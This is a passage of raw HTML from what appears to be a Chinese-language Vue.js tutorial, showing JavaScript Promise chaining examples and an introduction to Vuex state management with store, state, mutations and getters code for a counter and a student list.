class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// wrapped into</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 网络请求: aaa -&gt; 自己处理(10行)</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 处理: aaa111 -&gt; 自己处理(10行)</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 处理: aaa111222 -&gt; 自己处理</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">resolve</span>(<span class="string">&#x27;aaa&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res, <span class="string">&#x27;第一层的10行处理代码&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// resolve(res + &#x27;111&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">reject</span>(<span class="string">&#x27;err&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res, <span class="string">&#x27;第二层的10行处理代码&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">resolve</span>(res + <span class="string">&#x27;222&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res, <span class="string">&#x27;第三层的10行处理代码&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// new Promise(resolve =&gt; resolve(结果))简写</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">resolve</span>(<span class="string">&#x27;aaa&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res, <span class="string">&#x27;第一层的10行处理代码&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(res + <span class="string">&#x27;111&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res, <span class="string">&#x27;第二层的10行处理代码&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(res + <span class="string">&#x27;222&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res, <span class="string">&#x27;第三层的10行处理代码&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 省略掉Promise.resolve</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">resolve</span>(<span class="string">&#x27;aaa&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res, <span class="string">&#x27;第一层的10行处理代码&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> res + <span class="string">&#x27;111&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res, <span class="string">&#x27;第二层的10行处理代码&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> res + <span class="string">&#x27;222&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res, <span class="string">&#x27;第三层的10行处理代码&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// Promise.reject的缩写</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">resolve</span>(<span class="string">&#x27;aaa&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res, <span class="string">&#x27;第一层的10行处理代码&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// return Promise.reject(&#x27;error message&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">throw</span> <span class="string">&#x27;error message&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res, <span class="string">&#x27;第二层的10行处理代码&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(res + <span class="string">&#x27;222&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res, <span class="string">&#x27;第三层的10行处理代码&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="认识Vuex"><a href="#认识Vuex" class="headerlink" title="认识Vuex"></a>认识Vuex</h1><h2 id="Vuex是做什么的"><a href="#Vuex是做什么的" class="headerlink" title="Vuex是做什么的?"></a>Vuex是做什么的?</h2><p><strong>Vuex 是什么？</strong></p><p>官方解释：Vuex 是一个专为 Vue.js 应用程序开发的<strong>状态管理模式。</strong></p><p>它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。</p><p>Vuex 也集成到 Vue 的官方调试工具 <strong>devtools extension</strong>，提供了诸如零配置的 time-travel 调试、状态快照导入导出等高级调试功能。</p><hr><p><strong>状态管理到底是什么？</strong></p><p>其实，你可以简单的将其看成把需要多个组件共享的变量全部存储在一个对象里面。</p><p>然后，将这个对象放在顶层的Vue实例中，让其他组件可以使用，共享这个对象中的所有变量属性。</p><p>并且保证对象里面所有的属性做到<strong>响应式</strong>，Vuex就是为了提供这样一个在多个组件间共享状态的插件。</p><hr><p><strong>有什么状态是需要我们在多个组件间共享的呢？</strong></p><p>如果你做过大型开发应用，你一定遇到过多个状态在多个界面间的共享问题。</p><p>比如用户的登录状态、用户名称、头像、地理位置信息等等。</p><p>比如商品的收藏、购物车中的物品等等。</p><p>这些状态信息，我们都可以放在统一的地方，对它进行保存和管理，而且它们还是响应式的。</p><h2 id="单界面的状态管理"><a href="#单界面的状态管理" class="headerlink" title="单界面的状态管理"></a>单界面的状态管理</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201115061526.png"></p><ul><li>State：我们的状态。（姑且可以当做就是data中的属性）</li><li>View：视图层，可以针对State的变化显示不同的信息。</li><li>Actions：主要是用户的各种操作：点击、输入等，会导致状态的改变。</li></ul><blockquote><p>类似我们计数器案例中（<a href="https://nanzx.top/posts/a5b0/%EF%BC%89">https://nanzx.top/posts/a5b0/）</a></p><p>count需要某种方式被记录下来，也就是我们的State。<br>count目前的值需要被显示在界面中，也就是我们的View。<br>界面发生某些操作时（我们这里是用户的点击），需要去更新状态，也就是我们的Actions。</p></blockquote><h2 id="多界面的状态管理"><a href="#多界面的状态管理" class="headerlink" title="多界面的状态管理"></a>多界面的状态管理</h2><ul><li>Vue已经帮我们做好了单个界面的状态管理，但是如果是多个界面呢？<ul><li>多个视图都依赖同一个状态（一个状态改了，多个界面需要进行更新）</li><li>不同界面的Actions都想修改同一个状态（Home.vue需要修改，Profile.vue也需要修改这个状态）</li></ul></li><li>也就是说对于某些状态(状态1&#x2F;状态2&#x2F;状态3)来说只属于我们某一个视图，但是也有一些状态(状态a&#x2F;状态b&#x2F;状态c)属于多个视图共同想要维护的。<ul><li>状态1&#x2F;状态2&#x2F;状态3你放在自己的房间中，你自己管理自己用，没问题。</li><li>但是状态a&#x2F;状态b&#x2F;状态c我们希望交给一个大管家来统一帮助我们管理！！！</li><li>没错，Vuex就是为我们提供这个大管家的工具。</li></ul></li><li>全局单例模式（大管家）<ul><li>我们现在要做的就是将共享的状态抽取出来，交给我们的大管家统一进行管理。</li><li>之后，你们每个视图按照我规定好的规定进行访问和修改等操作。</li><li>这就是Vuex背后的基本思想。</li></ul></li></ul><h2 id="Vuex状态管理图例"><a href="#Vuex状态管理图例" class="headerlink" title="Vuex状态管理图例"></a>Vuex状态管理图例</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201115063220.png"></p><h1 id="Vuex的基本使用"><a href="#Vuex的基本使用" class="headerlink" title="Vuex的基本使用"></a>Vuex的基本使用</h1><p>我们可以在使用Vue CLI创建项目时安装vuex或者通过命令安装：<code>npm install vuex --save</code></p><p> 我们通过vuex实现一下之前简单的案例：计数器。</p><h2 id="（一）创建store实例"><a href="#（一）创建store实例" class="headerlink" title="（一）创建store实例"></a>（一）创建store实例</h2><p>在src&#x2F;store&#x2F;index.js中配置如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">getters</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">modules</span>: &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="（二）挂载到Vue实例中"><a href="#（二）挂载到Vue实例中" class="headerlink" title="（二）挂载到Vue实例中"></a>（二）挂载到Vue实例中</h2><p>在src&#x2F;main.js中配置如下：(这样在其他Vue组件中，我们就可以通过this.$store的方式，获取到这个store对象了)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  store,</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="（三）配置state和mutations"><a href="#（三）配置state和mutations" class="headerlink" title="（三）配置state和mutations"></a>（三）配置state和mutations</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">1000</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">getters</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">    <span class="title function_">add</span>(<span class="params">state</span>) &#123;</span><br><span class="line">      state.<span class="property">count</span>++;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">subtract</span>(<span class="params">state</span>) &#123;</span><br><span class="line">      state.<span class="property">count</span>--;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">modules</span>: &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="（四）使用vuex"><a href="#（四）使用vuex" class="headerlink" title="（四）使用vuex"></a>（四）使用vuex</h2><p>在src&#x2F;App.vue中配置如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123; this.$store.state.count &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addition&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;substraction&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&quot;App&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">addition</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;add&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">substraction</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;subtract&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="（五）小结"><a href="#（五）小结" class="headerlink" title="（五）小结"></a>（五）小结</h2><ol><li>提取出一个公共的store对象，用于保存在多个组件中共享的状态</li><li>将store对象放置在new Vue对象中，这样可以保证在所有的组件中都可以使用到</li><li>在其他组件中使用store对象中保存的状态即可<ul><li>通过this.$store.state.属性的方式来访问状态</li><li>通过this.$store.commit(‘mutation中方法’)来修改状态</li></ul></li></ol><blockquote><p><strong>注意事项：</strong><br>我们通过提交mutation的方式改变state里的状态属性，而非直接改变store.state.count的值。<br>这是因为Vuex可以通过提交mutation的方式更明确的追踪状态的变化。</p></blockquote><h1 id="State"><a href="#State" class="headerlink" title="State"></a>State</h1><p>通过<code>&#123;&#123; this.$store.state.info &#125;&#125;</code>获取state。</p><p>Vuex提出使用单一状态树，英文名称是Single Source of Truth，也可以翻译成单一数据源。</p><p>用一个生活中的例子做一个简单的类比：</p><ul><li>我们知道，在国内我们有很多的信息需要被记录，比如上学时的个人档案，工作后的社保记录，公积金记录，结婚后的婚姻信息，以及其他相关的户口、医疗、文凭、房产记录等等（还有很多信息）。</li><li>这些信息被分散在很多地方进行管理，有一天你需要办某个业务时(比如入户某个城市)，你会发现你需要到各个对应的工作地点去打印、盖章各种资料信息，最后到一个地方提交证明你的信息无误。</li><li>这种保存信息的方案，不仅仅低效，而且不方便管理，以及日后的维护也是一个庞大的工作(需要大量的各个部门的人力来维护，当然国家目前已经在完善我们的这个系统了)。</li></ul><p>这个和我们在应用开发中比较类似：</p><ul><li>如果你的状态信息是保存到多个Store对象中的，那么之后的管理和维护等等都会变得特别困难。</li><li>所以Vuex也使用了单一状态树来管理应用层级的全部状态。</li><li>单一状态树能够让我们最直接地找到某个状态的片段，而且在之后的维护和调试过程中，也可以非常方便地管理和维护。</li></ul><h1 id="Getters"><a href="#Getters" class="headerlink" title="Getters"></a>Getters</h1><p>通过<code>&#123;&#123; this.$store.getters.moreAgeStu &#125;&#125;</code>获取getters。传参在后面加括号传递。</p><p>有时候我们需要从store中获取一些state派生后的状态，可以通过getters（可以认为是 store 的计算属性，getter 的返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。），比如下面的Store中：</p><ul><li><p>获取所有年龄大于24岁的学生列表：<code>more24Stu(state)</code></p></li><li><p>如果我们已经有了一个获取所有年龄大于24岁的学生列表的getters, 那么获取年龄大于24岁的学生个数可以这样来写：<code>more24stuLen(state, getters) </code></p></li><li><p>getters<strong>默认是不能传递参数的</strong>, 如果希望传递参数, 那么只能让getters本身返回另一个函数：</p><p><code>moreAgeStu(state) &#123;return function (age) &#123;</code></p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">students</span>: [</span><br><span class="line">      &#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;nan&#x27;</span>, <span class="attr">age</span>: <span class="number">14</span>&#125;,</span><br><span class="line">      &#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;james&#x27;</span>, <span class="attr">age</span>: <span class="number">23</span>&#125;,</span><br><span class="line">      &#123;<span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;kobe&#x27;</span>, <span class="attr">age</span>: <span class="number">24</span>&#125;,</span><br><span class="line">      &#123;<span class="attr">id</span>: <span class="number">4</span>, <span class="attr">name</span>: <span class="string">&#x27;curry&#x27;</span>, <span class="attr">age</span>: <span class="number">30</span>&#125;,</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">getters</span>: &#123;</span><br><span class="line">    <span class="title function_">more24Stu</span>(<span class="params">state</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> state.<span class="property">students</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">s</span> =&gt;</span> s.<span class="property">age</span> &gt; <span class="number">24</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">more24stuLen</span>(<span class="params">state, getters</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> getters.<span class="property">more24Stu</span>.<span class="property">length</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">moreAgeStu</span>(<span class="params">state</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">age</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> state.<span class="property">students</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">s</span> =&gt;</span> s.<span class="property">age</span> &gt; age)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">modules</span>: &#123;&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Mutation"><a href="#Mutation" class="headerlink" 